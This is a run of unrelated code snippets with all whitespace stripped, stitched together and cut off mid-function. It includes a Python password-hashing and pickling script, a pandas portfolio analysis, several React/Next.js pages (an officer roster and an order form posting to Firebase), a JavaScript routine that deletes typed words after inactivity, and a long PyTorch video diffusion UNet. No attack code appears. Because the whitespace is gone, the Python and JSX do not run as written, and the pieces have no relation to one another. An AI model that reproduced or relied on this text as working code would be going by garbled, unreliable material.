tHeader;fromgetpassimportgetpassimportscryptimportpicklepassword=scrypt.hash(getpass('Passwsord:'),'randomsalt')withopen('password.pkl','wb')asf:pickle.dump(password,f)importpandasaspddf=pd.read_csv('data/portfolio.tsv',sep='\t')long_df=df[df['LONGTERM']==True]#convertlongtermweighttonumberlong_df['longtermweight']=long_df['longtermweight'].str.rstrip('%').astype('float')/100.0defshow(df):sectors=df['GICSSECTOR'].unique()forsectorinsectors:companies=df[df['GICSSECTOR']==sector]['TICKER'].unique()print()print(sector)forcompanyincompanies:#print(company+'('+df[df['TICKER']==company]['WEIGHT(%)'].values[0],end='),')print(company+'('+df[df['TICKER']==company]['longtermweight'].values[0],end='),')#printthesectorweightsforonlylongterminvestmentsdeflong_categories(df):sectors=df['GICSSECTOR'].unique()forsectorinsectors:weight=df[df['GICSSECTOR']==sector]['longtermweight'].sum()print(sector+':'+str(100*weight))long_categories(long_df)constInbox=()=>{return<div>InboxPage</div>;};exportdefaultInbox;importReactfrom'react';importImagefrom'next/legacy/image';//Importfrom'next/image'constofficers=[{name:'RubyGao',position:'President',imageUrl:'/ruby_beautify.jpg'},{name:'LynnHuang',position:'VicePresident',imageUrl:'/lynn.png'},{name:'SydneyDanon',position:'Secretary',imageUrl:'/sydney.png'},{name:'RitvikIrigireddy',position:'Treasurer',imageUrl:'/ritvik.jpeg'},{name:'NathanDai',position:'DirectorofCorporateSynergyandStrategicAlignment',imageUrl:'/wayne.jpeg',},{name:'ColeTerjesen',position:'PresidentElect',imageUrl:'/cole-cropped.jpg'},//...addmoreofficersasneeded];exportdefaultfunctionMeetYourOfficers(){return(<divclassName='mx-automax-w-7xlpx-2sm:px-6lg:px-8pb-10mb-12'><h1className='text-4xlfont-boldmb-10text-blue-500'>MeetYourOfficers</h1><divclassName='gridgrid-cols-2sm:grid-cols-2lg:grid-cols-3gap-6'>{officers.map((officer,index)=>(<divkey={index}className={'officer-infop-4text-center'+((officer.name==='NathanDai')?'rounded-lgbg-gradient-to-brfrom-slate-50to-slate-300shadow-2xlring-1ring-blue-500/50hover:ring-blue-500':'')}id={officer.name.split('')[0].toLowerCase()}><divclassName='relativeinline-blockw-40h-40mx-automb-4'><Imagesrc={officer.imageUrl}alt={`Imageof${officer.name}`}layout='fill'objectFit='cover'//Thiswillcovertheareaofthediv,youcanalsouse'contain'ifyoudon'twanttocroptheimageclassName='rounded-full'/></div><h2className='text-xlfont-semibold'>{officer.name}</h2><pclassName='text-mdtext-gray-600'>{officer.position}</p></div>))}</div></div>);}constTIMEOUT=5;constPERIOD=1;constDELAY=0.1;constCHARACTERS='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';functionsleep(seconds){returnnewPromise(resolve=>setTimeout(resolve,1000*seconds));}classStopwatch{constructor(delay=DELAY){this.delay=delay;}start(){this.start_time=Date.now();this.end_time=this.start_time;this.running=true;}restart(){this.start();}stop(){this.end_time=Date.now();this.running=false;}update(){if(this.running){sleep(this.delay);this.end_time=Date.now();}}getelapsed(){this.update();return(this.end_time-this.start_time)/1000;}}functionpressed(event){if(event==undefined){returnfalse;}returnCHARACTERS.includes(event.key);}functiondelete_word(){letevent=newKeyboardEvent('keydown',{key:'Backspace',ctrlKey:true});document.dispatchEvent(event);}functionstart_deleting(period){letstopwatch=newStopwatch();stopwatch.start();leti=0;while(true){if(pressed()){return;}if(Math.floor(stopwatch.elapsed)==i){delete_word();i+=period;}}}functionmain(){letstopwatch=newStopwatch();stopwatch.start();while(true){stopwatch.update();if(pressed()){stopwatch.restart();}if(stopwatch.elapsed>TIMEOUT){start_deleting(PERIOD);}}}document.addEventListener('keydown',pressed);importOrderFormfrom'@/components/OrderForm';importNavbarfrom'@/components/Navbar';importHeadfrom'next/head';importFooterfrom'@/components/Footer';importdbfrom'@/firebase/firebase';import{collection,addDoc}from'firebase/firestore';constOrder=()=>{constgenerateEmail=(values)=>{constproductNameMap={'slim-dry-erase':'FinePointDryEraseMarkers','large-dry-erase':'LargeChiselTipDryEraseMarkers',};values['content']=`Hello${values['name']},\n\nWehavereceivedyourorderfor${values['quantity']}${productNameMap[values['product']]}andwillbeintouchwithyoushortlytofacilitatethecompletionofyourpurchase.ThankyouforchoosingEnduraScribe!\n\nBest,\nCharlesWen\nEnduraScribe`;values['send_subject']='Thankyouforyourorder!';values['type']='order';returnvalues;};consthandleSubmit=async(values)=>{try{awaitaddDoc(collection(db,'orders'),values);values=generateEmail(values);constresponse=awaitfetch('/api/email',{method:'POST',headers:{'Content-Type':'application/json',},body:JSON.stringify({values}),});if(response.ok){console.log('Emailsent');//redirecttoconfirmpagewindow.location.href='/order/confirm';}else{thrownewError(response.statusText);}}catch(error){console.log('Errorsubmittingorder',error);}};return(<divclassName='bg-slate-50h-screenoverflow-auto'><Head><title>Order</title><linkrel='icon'href='/favicon.png'/></Head><Navbar/><divclassName='flexjustify-centermt-10'><divclassName='max-w-lgrounded-xlshadow-lgbg-whitep-5'><h1className='text-4xlfont-boldtext-centermb-2'>OrderForm</h1><pclassName='text-gray-500'>Whenyousubmitthisform,youwillreceiveaconfirmationemail.Ourteamwillfollowupwithyoutofacilitatethecompletionofthepurchase.</p></div></div><divclassName='m-10'><OrderFormonSubmit={handleSubmit}/></div><Footer/></div>);};exportdefaultOrder;fromfunctoolsimportpartialfromtypingimportList,Optional,Unionfromeinopsimportrearrangefrom...modules.diffusionmodules.openaimodelimport*from...modules.video_attentionimportSpatialVideoTransformerfrom...modules.spacetime_attentionimport(BasicTransformerTimeMixBlock,PostHocSpatialTransformerWithTimeMixing,PostHocSpatialTransformerWithTimeMixingAndMotion)from...utilimportdefaultfrom.utilimportAlphaBlender#,LegacyAlphaBlenderWithBug,get_alphaclassVideoResBlock(ResBlock):def__init__(self,channels:int,emb_channels:int,dropout:float,video_kernel_size:Union[int,List[int]]=3,merge_strategy:str="fixed",merge_factor:float=0.5,out_channels:Optional[int]=None,use_conv:bool=False,use_scale_shift_norm:bool=False,dims:int=2,use_checkpoint:bool=False,up:bool=False,down:bool=False,):super().__init__(channels,emb_channels,dropout,out_channels=out_channels,use_conv=use_conv,use_scale_shift_norm=use_scale_shift_norm,dims=dims,use_checkpoint=use_checkpoint,up=up,down=down,)self.time_stack=ResBlock(default(out_channels,channels),emb_channels,dropout=dropout,dims=3,out_channels=default(out_channels,channels),use_scale_shift_norm=False,use_conv=False,up=False,down=False,kernel_size=video_kernel_size,use_checkpoint=use_checkpoint,exchange_temb_dims=True,)self.time_mixer=AlphaBlender(alpha=merge_factor,merge_strategy=merge_strategy,rearrange_pattern="bt->b1t11",)defforward(self,x:th.Tensor,emb:th.Tensor,num_video_frames:int,image_only_indicator:Optional[th.Tensor]=None,)->th.Tensor:x=super().forward(x,emb)x_mix=rearrange(x,"(bt)chw->bcthw",t=num_video_frames)x=rearrange(x,"(bt)chw->bcthw",t=num_video_frames)x=self.time_stack(x,rearrange(emb,"(bt)...->bt...",t=num_video_frames))x=self.time_mixer(x_spatial=x_mix,x_temporal=x,image_only_indicator=image_only_indicator)x=rearrange(x,"bcthw->(bt)chw")returnxclassVideoUNet(nn.Module):def__init__(self,in_channels:int,model_channels:int,out_channels:int,num_res_blocks:int,attention_resolutions:int,dropout:float=0.0,channel_mult:List[int]=(1,2,4,8),conv_resample:bool=True,dims:int=2,num_classes:Optional[int]=None,use_checkpoint:bool=False,num_heads:int=-1,num_head_channels:int=-1,num_heads_upsample:int=-1,use_scale_shift_norm:bool=False,resblock_updown:bool=False,transformer_depth:Union[List[int],int]=1,transformer_depth_middle:Optional[int]=None,context_dim:Optional[int]=None,time_downup:bool=False,time_context_dim:Optional[int]=None,extra_ff_mix_layer:bool=False,use_spatial_context:bool=False,merge_strategy:str="fixed",merge_factor:float=0.5,spatial_transformer_attn_type:str="softmax",video_kernel_size:Union[int,List[int]]=3,use_linear_in_transformer:bool=False,adm_in_channels:Optional[int]=None,disable_temporal_crossattention:bool=False,max_ddpm_temb_period:int=10000,):super().__init__()assertcontext_dimisnotNoneifnum_heads_upsample==-1:num_heads_upsample=num_headsifnum_heads==-1:assertnum_head_channels!=-1ifnum_head_channels==-1:assertnum_heads!=-1self.in_channels=in_channelsself.model_channels=model_channelsself.out_channels=out_channelsifisinstance(transformer_depth,int):transformer_depth=len(channel_mult)*[transformer_depth]transformer_depth_middle=default(transformer_depth_middle,transformer_depth[-1])self.num_res_blocks=num_res_blocksself.attention_resolutions=attention_resolutionsself.dropout=dropoutself.channel_mult=channel_multself.conv_resample=conv_resampleself.num_classes=num_classesself.use_checkpoint=use_checkpointself.num_heads=num_headsself.num_head_channels=num_head_channelsself.num_heads_upsample=num_heads_upsampletime_embed_dim=model_channels*4self.time_embed=nn.Sequential(linear(model_channels,time_embed_dim),nn.SiLU(),linear(time_embed_dim,time_embed_dim),)ifself.num_classesisnotNone:ifisinstance(self.num_classes,int):self.label_emb=nn.Embedding(num_classes,time_embed_dim)elifself.num_classes=="continuous":print("settinguplinearc_admembeddinglayer")self.label_emb=nn.Linear(1,time_embed_dim)elifself.num_classes=="timestep":self.label_emb=nn.Sequential(Timestep(model_channels),nn.Sequential(linear(model_channels,time_embed_dim),nn.SiLU(),linear(time_embed_dim,time_embed_dim),),)elifself.num_classes=="sequential":assertadm_in_channelsisnotNoneself.label_emb=nn.Sequential(nn.Sequential(linear(adm_in_channels,time_embed_dim),nn.SiLU(),linear(time_embed_dim,time_embed_dim),))else:raiseValueError()self.input_blocks=nn.ModuleList([TimestepEmbedSequential(conv_nd(dims,in_channels,model_channels,3,padding=1))])self._feature_size=model_channelsinput_block_chans=[model_channels]ch=model_channelsds=1defget_attention_layer(ch,num_heads,dim_head,depth=1,context_dim=None,use_checkpoint=False,disabled_sa=False,):returnSpatialVideoTransformer(ch,num_heads,dim_head,depth=depth,context_dim=context_dim,time_context_dim=time_context_dim,dropout=dropout,ff_in=extra_ff_mix_layer,use_spatial_context=use_spatial_context,merge_strategy=merge_strategy,merge_factor=merge_factor,checkpoint=use_checkpoint,use_linear=use_linear_in_transformer,attn_mode=spatial_transformer_attn_type,disable_self_attn=disabled_sa,disable_temporal_crossattention=disable_temporal_crossattention,max_time_embed_period=max_ddpm_temb_period,)defget_resblock(merge_factor,merge_strategy,video_kernel_size,ch,time_embed_dim,dropout,out_ch,dims,use_checkpoint,use_scale_shift_norm,down=False,up=False,):returnVideoResBlock(merge_factor=merge_factor,merge_strategy=merge_strategy,video_kernel_size=video_kernel_size,channels=ch,emb_channels=time_embed_dim,dropout=dropout,out_channels=out_ch,dims=dims,use_checkpoint=use_checkpoint,use_scale_shift_norm=use_scale_shift_norm,down=down,up=up,)forlevel,multinenumerate(channel_mult):for_inrange(num_res_blocks):layers=[get_resblock(merge_factor=merge_factor,merge_strategy=merge_strategy,video_kernel_size=video_kernel_size,ch=ch,time_embed_dim=time_embed_dim,dropout=dropout,out_ch=mult*model_channels,dims=dims,use_checkpoint=use_checkpoint,use_scale_shift_norm=use_scale_shift_norm,)]ch=mult*model_channelsifdsinattention_resolutions:ifnum_head_channels==-1:dim_head=ch//num_headselse:num_heads=ch//num_head_channelsdim_head=num_head_channelslayers.append(get_attention_layer(ch,num_heads,dim_head,depth=transformer_depth[level],context_dim=context_dim,use_checkpoint=use_checkpoint,disabled_sa=False,))self.input_blocks.append(TimestepEmbedSequential(*layers))self._feature_size+=chinput_block_chans.append(ch)iflevel!=len(channel_mult)-1:ds*=2out_ch=chself.input_blocks.append(TimestepEmbedSequential(get_resblock(merge_factor=merge_factor,merge_strategy=merge_strategy,video_kernel_size=video_kernel_size,ch=ch,time_embed_dim=time_embed_dim,dropout=dropout,out_ch=out_ch,dims=dims,use_checkpoint=use_checkpoint,use_scale_shift_norm=use_scale_shift_norm,down=True,)ifresblock_updownelseDownsample(ch,conv_resample,dims=dims,out_channels=out_ch,third_down=time_downup,)))ch=out_chinput_block_chans.append(ch)self._feature_size+=chifnum_head_channels==-1:dim_head=ch//num_headselse:num_heads=ch//num_head_channelsdim_head=num_head_channelsself.middle_block=TimestepEmbedSequential(get_resblock(merge_factor=merge_factor,merge_strategy=merge_strategy,video_kernel_size=video_kernel_size,ch=ch,time_embed_dim=time_embed_dim,out_ch=None,dropout=dropout,dims=dims,use_checkpoint=use_checkpoint,use_scale_shift_norm=use_scale_shift_norm,),get_attention_layer(ch,num_heads,dim_head,depth=transformer_depth_middle,context_dim=context_dim,use_checkpoint=use_checkpoint,),get_resblock(merge_factor=merge_factor,merge_strategy=merge_strategy,video_kernel_size=video_kernel_size,ch=ch,out_ch=None,time_embed_dim=time_embed_dim,dropout=dropout,dims=dims,use_checkpoint=use_checkpoint,use_scale_shift_norm=use_scale_shift_norm,),)self._feature_size+=chself.output_blocks=nn.ModuleList([])forlevel,multinlist(enumerate(channel_mult))[::-1]:foriinrange(num_res_blocks+1):ich=input_block_chans.pop()layers=[get_resblock(merge_factor=merge_factor,merge_strategy=merge_strategy,video_kernel_size=video_kernel_size,ch=ch+ich,time_embed_dim=time_embed_dim,dropout=dropout,out_ch=model_channels*mult,dims=dims,use_checkpoint=use_checkpoint,use_scale_shift_norm=use_scale_shift_norm,)]ch=model_channels*multifdsinattention_resolutions:ifnum_head_channels==-1:dim_head=ch//num_headselse:num_heads=ch//num_head_channelsdim_head=num_head_channelslayers.append(get_attention_layer(ch,num_heads,dim_head,depth=transformer_depth[level],context_dim=context_dim,use_checkpoint=use_checkpoint,disabled_sa=False,))iflevelandi==num_res_blocks:out_ch=chds//=2layers.append(get_resblock(merge_factor=merge_factor,merge_strategy=merge_strategy,video_kernel_size=video_kernel_size,ch=ch,time_embed_dim=time_embed_dim,dropout=dropout,out_ch=out_ch,dims=dims,use_checkpoint=use_checkpoint,use_scale_shift_norm=use_scale_shift_norm,up=True,)ifresblock_updownelseUpsample(ch,conv_resample,dims=dims,out_channels=out_ch,third_up=time_downup,))self.output_blocks.append(TimestepEmbedSequential(*layers))self._feature_size+=chself.out=nn.Sequential(normalization(ch),nn.SiLU(),zero_module(conv_nd(dims,model_channels,out_channels,3,padding=1)),)defforward(self,x:th.Tensor,timesteps:th.Tensor,context:Optional[th.Tensor]=None,y:Optional[th.Tensor]=None,time_context:Optional[th.Tensor]=None,num_video_frames:Optional[int]=None,image_only_indicator:Optional[th.Tensor]=None,):assert(yisnotNone)==(self.num_classesisnotNone),"mustspecifyyifandonlyifthemodelisclass-conditional->no,relaxthisTODO"hs=[]t_emb=timestep_embedding(timesteps,self.model_channels,repeat_only=False)emb=self.time_embed(t_emb)ifself.num_classesisnotNone:asserty.shape[0]==x.shape[0]emb=emb+self.label_emb(y)h=xformoduleinself.input_blocks:h=module(h,emb,context=context,image_only_indicator=image_only_indicator,time_context=time_context,num_video_frames=num_video_frames,)hs.append(h)h=self.middle_block(h,emb,context=context,image_only_indicator=image_only_indicator,time_context=time_context,num_video_frames=num_video_frames,)formoduleinself.output_blocks:h=th.cat([h,hs.pop()],dim=1)h=module(h,emb,context=context,image_only_indicator=image_only_indicator,time_context=time_context,num_video_frames=num_video_frames,)h=h.type(x.dtype)returnself.out(h)classPostHocAttentionBlockWithTimeMixing(AttentionBlock):def__init__(self,in_channels:int,n_heads:int,d_head:int,use_checkpoint:bool=False,use_new_attention_order:bool=False,dropout:float=0.0,use_spatial_context:bool=False,merge_strategy:bool="fixed",merge_factor:float=0.5,apply_sigmoid_to_merge:bool=True,ff_in:bool=False,attn_mode:str="softmax",disable_temporal_crossattention:bool=False,):super().__init__(in_channels,n_heads,d_head,use_checkpoint=use_checkpoint,use_new_attention_order=use_new_attention_order,)inner_dim=n_heads*d_headself.time_mix_blocks=nn.ModuleList([BasicTransformerTimeMixBlock(inner_dim,n_heads,d_head,dropout=dropout,checkpoint=use_checkpoint,ff_in=ff_in,attn_mode=attn_mode,disable_temporal_crossattention=disable_temporal_crossattention,)])self.in_channels=in_channelstime_embed_dim=self.in_channels*4self.time_mix_time_embed=nn.Sequential(linear(self.in_channels,time_embed_dim),nn.SiLU(),linear(time_embed_dim,self.in_channels),)self.use_spatial_context=use_spatial_contextifmerge_strategy=="fixed":self.register_buffer("mix_factor",th.Tensor([merge_factor]))elifmerge_strategy=="learned"ormerge_strategy=="learned_with_images":self.register_parameter("mix_factor",th.nn.Parameter(th.Tensor([merge_factor])))elifmerge_strategy=="fixed_with_images":self.mix_factor=Noneelse:raiseValueError(f"unknownmergestrategy{merge_strategy}")self.get_alpha_fn=functools.partial(get_alpha,merge_strategy,self.mix_factor,apply_sigmoid=apply_sigmoid_to_merge,)defforward(self,x:th.Tensor,context:Optional[th.Tensor]=None,#cam:Optional[th.Tensor]=None,time_context:Optional[th.Tensor]=None,timesteps:Optional[int]=None,image_only_indicator:Optional[th.Tensor]=None,conv_view:Optional[th.Tensor]=None,conv_motion:Optional[th.Tensor]=None,):iftime_contextisnotNone:raiseNotImplementedError_,_,h,w=x.shapeifexists(context):context=rearrange(context,"bt...->(bt)...")ifself.use_spatial_context:time_context=repeat(context[:,0],"b...->(bn)...",n=h*w)x=super().forward(x,)x=rearrange(x,"bchw->b(hw)c")x_mix=xnum_frames=th.arange(timesteps,device=x.device)num_frames=repeat(num_frames,"t->bt",b=x.shape[0]//timesteps)num_frames=rearrange(num_frames,"bt->(bt)")t_emb=timestep_embedding(num_frames,self.in_channels,repeat_only=False)emb=self.time_mix_time_embed(t_emb)emb=emb[:,None,:]x_mix=x_mix+embx_mix=self.time_mix_blocks[0](x_mix,context=time_context,timesteps=timesteps)alpha=self.get_alpha_fn(image_only_indicator=image_only_indicator)x=alpha*x+(1.0-alpha)*x_mixx=rearrange(x,"b(hw)c->bchw",h=h,w=w)returnxclassPostHocResBlockWithTime(ResBlock):def__init__(self,channels:int,emb_channels:int,dropout:float,time_kernel_size:Union[int,List[int]]=3,merge_strategy:bool="fixed",merge_factor:float=0.5,apply_sigmoid_to_merge:bool=True,out_channels:Optional[int]=None,use_conv:bool=False,use_scale_shift_norm:bool=False,dims:int=2,use_checkpoint:bool=False,up:bool=False,down:bool=False,time_mix_legacy:bool=True,replicate_bug:bool=False,):super().__init__(channels,emb_channels,dropout,out_channels=out_channels,use_conv=use_conv,use_scale_shift_norm=use_scale_shift_norm,dims=dims,use_checkpoint=use_checkpoint,up=up,down=down,)self.time_mix_blocks=ResBlock(default(out_channels,channels),emb_channels,dropout=dropout,dims=3,out_channels=default(out_channels,channels),use_scale_shift_norm=False,use_conv=False,up=False,down=False,kernel_size=time_kernel_size,use_checkpoint=use_checkpoint,exchange_temb_dims=True,)self.time_mix_legacy=time_mix_legacyifself.time_mix_legacy:ifmerge_strategy=="fixed":self.register_buffer("mix_factor",th.Tensor([merge_factor]))elifmerge_strategy=="learned"ormerge_strategy=="learned_with_images":self.register_parameter("mix_factor",th.nn.Parameter(th.Tensor([merge_factor])))elifmerge_strategy=="fixed_with_images":self.mix_factor=Noneelse:raiseValueError(f"unknownmergestrategy{merge_strategy}")self.get_alpha_fn=functools.partial(get_alpha,merge_strategy,self.mix_factor,apply_sigmoid=apply_sigmoid_to_merge,)else:ifFalse:#replicate_bug:logpy.warning("*****************************************************************************************\n""GRAVEWARNING:YOU'REUSINGTHEBUGGYLEGACYALPHABLENDER!!!AREYOUSUREYOUWANTTHIS?!\n""*****************************************************************************************")self.time_mixer=LegacyAlphaBlenderWithBug(alpha=merge_factor,merge_strategy=merge_strategy,rearrange_pattern="bt->b1t11",)else:self.time_mixer=AlphaBlender(alpha=merge_factor,merge_strategy=merge_strategy,rearrange_pattern="bt->b1t11",)defforward(self,x:th.Tensor,emb:th.Tensor,num_video_frames:int,image_only_indicator:Optional[th.Tensor]=None,cond_view:Optional[th.Tensor]=None,cond_motion:Optional[th.Tensor]=None,)->th.Tensor:x=super().forward(x,emb)x_mix=rearrange(x,"(bt)chw->bcthw",t=num_video_frames)x=rearrange(x,"(bt)chw->bcthw",t=num_video_frames)x=self.time_mix_blocks(x,rearrange(emb,"(bt)...->bt...",t=num_video_frames))ifself.time_mix_legacy:alpha=self.get_alpha_fn(image_only_indicator=image_only_indicator)x=alpha.to(x.dtype)*x+(1.0-alpha).to(x.dtype)*x_mixelse:x=self.time_mixer(x_spatial=x_mix,x_temporal=x,image_only_indicator=image_only_indicator)x=rearrange(x,"bcthw->(bt)chw")returnxclassSpatialUNetModelWithTime(nn.Module):def__init__(self,in_channels:int,model_channels:int,out_channels:int,num_res_blocks:int,attention_resolutions:int,dropout:float=0.0,channel_mult:List[int]=(1,2,4,8),conv_resample:bool=True,dims:int=2,num_classes:Optional[int]=None,use_checkpoint:bool=False,num_heads:int=-1,num_head_channels:int=-1,num_heads_upsample:int=-1,use_scale_shift_norm:bool=False,resblock_updown:bool=False,use_new_attention_order:bool=False,use_spatial_transformer:bool=False,transformer_depth:Union[List[int],int]=1,transformer_depth_middle:Optional[int]=None,context_dim:Optional[int]=None,time_downup:bool=False,time_context_dim:Optional[int]=None,extra_ff_mix_layer:bool=False,use_spatial_context:bool=False,time_block_merge_strategy:str="fixed",time_block_merge_factor:float=0.5,spatial_transformer_attn_type:str="softmax",time_kernel_size:Union[int,List[int]]=3,use_linear_in_transformer:bool=False,legacy:bool=True,adm_in_channels:Optional[int]=None,use_temporal_resblock:bool=True,disable_temporal_crossattention:bool=False,time_mix_legacy:bool=True,max_ddpm_temb_period:int=10000,replicate_time_mix_bug:bool=False,use_motion_attention:bool=False,):super().__init__()ifuse_spatial_transformer:assertcontext_dimisnotNoneifcontext_dimisnotNone:assertuse_spatial_transformerifnum_heads_upsample==-1:num_heads_upsample=num_headsifnum_heads==-1:assertnum_head_channels!=-1ifnum_head_channels==-1:assertnum_heads!=-1self.in_channels=in_channelsself.model_channels=model_channelsself.out_channels=out_channelsifisinstance(transformer_depth,int):transformer_depth=len(channel_mult)*[transformer_depth]transformer_depth_middle=default(transformer_depth_middle,transformer_depth[-1])self.num_res_blocks=num_res_blocksself.attention_resolutions=attention_resolutionsself.dropout=dropoutself.channel_mult=channel_multself.conv_resample=conv_resampleself.num_classes=num_classesself.use_checkpoint=use_checkpointself.num_heads=num_headsself.num_head_channels=num_head_channelsself.num_heads_upsample=num_heads_upsampleself.use_temporal_resblocks=use_temporal_resblocktime_embed_dim=model_channels*4self.time_embed=nn.Sequential(linear(model_channels,time_embed_dim),nn.SiLU(),linear(time_embed_dim,time_embed_dim),)ifself.num_classesisnotNone:ifisinstance(self.num_classes,int):self.label_emb=nn.Embedding(num_classes,time_embed_dim)elifself.num_classes=="continuous":print("settinguplinearc_admembeddinglayer")self.label_emb=nn.Linear(1,time_embed_dim)elifself.num_classes=="timestep":self.label_emb=nn.Sequential(Timestep(model_channels),nn.Sequential(linear(model_channels,time_embed_dim),nn.SiLU(),linear(time_embed_dim,time_embed_dim),),)elifself.num_classes=="sequential":assertadm_in_channelsisnotNoneself.label_emb=nn.Sequential(nn.Sequential(linear(adm_in_channels,time_embed_dim),nn.SiLU(),linear(time_embed_dim,time_embed_dim),))else:raiseValueError()self.input_blocks=nn.ModuleList([TimestepEmbedSequential(conv_nd(dims,in_channels,model_channels,3,padding=1))])self._feature_size=model_channelsinput_block_chans=[model_channels]ch=model_channelsds=1defget_attention_layer(ch,num_heads,dim_head,depth=1,context_dim=None,use_checkpoint=False,disabled_sa=False,):ifnotuse_spatial_transformer:returnPostHocAttentionBlockWithTimeMixing(ch,num_heads,dim_head,use_checkpoint=use_checkpoint,use_new_attention_order=use_new_attention_order,dropout=dropout,ff_in=extra_ff_mix_layer,use_spatial_context=use_spatial_context,merge_strategy=time_block_merge_strategy,merge_factor=time_block_merge_factor,attn_mode=spatial_transformer_attn_type,disable_temporal_crossattention=disable_temporal_crossattention,)elifuse_motion_attention:returnPostHocSpatialTransformerWithTimeMixingAndMotion(ch,num_heads,dim_head,depth=depth,context_dim=context_dim,time_context_dim=time_context_dim,dropout=dropout,ff_in=extra_ff_mix_layer,use_spatial_context=use_spatial_context,merge_strategy=time_block_merge_strategy,merge_factor=time_block_merge_factor,checkpoint=use_checkpoint,use_linear=use_linear_in_transformer,attn_mode=spatial_transformer_attn_type,disable_self_attn=disabled_sa,disable_temporal_crossattention=disable_temporal_crossattention,time_mix_legacy=time_mix_legacy,max_time_embed_period=max_ddpm_temb_period,)else:returnPostHocSpatialTransformerWithTimeMixing(ch,num_heads,dim_head,depth=depth,context_dim=context_dim,time_context_dim=time_context_dim,dropout=dropout,ff_in=extra_ff_mix_layer,use_spatial_context=use_spatial_context,merge_strategy=time_block_merge_strategy,merge_factor=time_block_merge_factor,checkpoint=use_checkpoint,use_linear=use_linear_in_transformer,attn_mode=spatial_transformer_attn_type,disable_self_attn=disabled_sa,disable_temporal_crossattention=disable_temporal_crossattention,time_mix_legacy=time_mix_legacy,max_time_embed_period=max_ddpm_temb_period,)defget_resblock(time_block_merge_factor,time_block_merge_strategy,time_kernel_size,ch,time_embed_dim,dropout,out_ch,dims,use_checkpoint,use_scale_shift_norm,down=False,up=False,):ifself.use_temporal_resblocks:returnPostHocResBlockWithTime(merge_factor=time_block_merge_factor,merge_strategy=time_block_merge_strategy,time_kernel_size=time_kernel_size,channels=ch,emb_channels=time_embed_dim,dropout=dropout,out_channels=out_ch,dims=dims,use_checkpoint=use_checkpoint,use_scale_shift_norm=use_scale_shift_norm,down=down,up=up,time_mix_legacy=time_mix_legacy,replicate_bug=replicate_time_mix_bug,)else:returnResBlock(channels=ch,emb_channels=time_embed_dim,dropout=dropout,out_channels=out_ch,use_checkpoint=use_checkpoint,dims=dims,use_scale_shift_norm=use_scale_shift_norm,down=down,up=up,)forlevel,multinenumerate(channel_mult):for_inrange(num_res_blocks):layers=[get_resblock(time_block_merge_factor=time_block_merge_factor,time_block_merge_strategy=time_block_merge_strategy,time_kernel_size=time_kernel_size,ch=ch,time_embed_dim=time_embed_dim,dropout=dropout,out_ch=mult*model_channels,dims=dims,use_checkpoint=use_checkpoint,use_scale_shift_norm=use_scale_shift_norm,)]ch=mult*model_channelsifdsinattention_resolutions:ifnum_head_channels==-1:dim_head=ch//num_headselse:num_heads=ch//num_head_channelsdim_head=num_head_channelsiflegacy:dim_head=(ch//num_headsifuse_spatial_transformerelsenum_head_channels)layers.append(get_attention_layer(ch,num_heads,dim_head,depth=transformer_depth[level],context_dim=context_dim,use_checkpoint=use_checkpoint,disabled_sa=False,))self.input_blocks.append(TimestepEmbedSequential(*layers))self._feature_size+=chinput_block_chans.append(ch)iflevel!=len(channel_mult)-1:ds*=2out_ch=chself.input_blocks.append(TimestepEmbedSequential(get_resblock(time_block_merge_factor=time_block_merge_factor,time_block_merge_strategy=time_block_merge_strategy,time_kernel_size=time_kernel_size,ch=ch,time_embed_dim=time_embed_dim,dropout=dropout,out_ch=out_ch,dims=dims,use_checkpoint=use_checkpoint,use_scale_shift_norm=use_scale_shift_norm,down=True,)ifresblock_updownelseDownsample(ch,conv_resample,dims=dims,out_channels=out_ch,third_down=time_downup,)))ch=out_chinput_block_chans.append(ch)self._feature_size+=chifnum_head_channels==-1:dim_head=ch//num_headselse:num_heads=ch//num_head_channelsdim_head=num_head_channelsiflegacy:#num_heads=1dim_head=ch//num_headsifuse_spatial_transformerelsenum_head_channelsself.middle_block=TimestepEmbedSequential(get_resblock(time_block_merge_factor=time_block_merge_factor,time_block_merge_strategy=time_block_merge_strategy,time_kernel_size=time_kernel_size,ch=ch,time_embed_dim=time_embed_dim,out_ch=None,dropout=dropout,dims=dims,use_checkpoint=use_checkpoint,use_scale_shift_norm=use_scale_shift_norm,),get_attention_layer(ch,num_heads,dim_head,depth=transformer_depth_middle,context_dim=context_dim,use_checkpoint=use_checkpoint,),get_resblock(time_block_merge_factor=time_block_merge_factor,time_block_merge_strategy=time_block_merge_strategy,time_kernel_size=time_kernel_size,ch=ch,out_ch=None,time_embed_dim=time_embed_dim,dropout=dropout,dims=dims,use_checkpoint=use_checkpoint,use_scale_shift_norm=use_scale_shift_norm,),)self._feature_size+=chself.output_blocks=nn.ModuleList([])forlevel,multinlist(enumerate(channel_mult))[::-1]:foriinrange(num_res_blocks+1):ich=input_block_chans.pop()layers=[get_resblock(time_block_merge_factor=time_block_merge_factor,time_block_merge_strategy=time_block_merge_strategy,time_kernel_size=time_kernel_size,ch=ch+ich,time_embed_dim=time_embed_dim,dropout=dropout,out_ch=model_channels*mult,dims=dims,use_checkpoint=use_checkpoint,use_scale_shift_norm=use_scale_shift_norm,)]ch=model_channels*multifdsinattention_resolutions:ifnum_head_channels==-1:dim_head=ch//num_headselse:num_heads=ch//num_head_channelsdim_head=num_head_channelsiflegacy:dim_head=(ch//num_headsifuse_spatial_transformerelsenum_head_channels)layers.append(get_attention_layer(ch,num_heads,dim_head,depth=transformer_depth[level],context_dim=context_dim,use_checkpoint=use_checkpoint,disabled_sa=False,))iflevelandi==num_res_blocks:out_ch=chds//=2layers.append(get_resblock(time_block_merge_factor=time_block_merge_factor,time_block_merge_strategy=time_block_merge_strategy,time_kernel_size=time_kernel_size,ch=ch,time_embed_dim=time_embed_dim,dropout=dropout,out_ch=out_ch,dims=dims,use_checkpoint=use_checkpoint,use_scale_shift_norm=use_scale_shift_norm,up=True,)ifresblock_updownelseUpsample(ch,conv_resample,dims=dims,out_channels=out_ch,third_up=time_downup,))self.output_blocks.append(TimestepEmbedSequential(*layers))self._feature_size+=chself.out=nn.Sequential(normalization(ch),nn.SiLU(),zero_module(conv_nd(dims,model_channels,out_channels,3,padding=1)),)defforward(self,x:th.Tensor,timesteps:th.Tensor,context:Optional[th.Tensor]=None,y:Optional[th.Tensor]=None,#cam:Optional[th.Tensor]=None,time_context:Optional[th.Tensor]=None,num_video_frames:Optional[int]=None,image_only_indicator:Optional[th.Tensor]=None,cond_view:Optional[th.Tensor]=None,cond_motion:Optional[th.Tensor]=None,time_step:Optional[int]=None,):a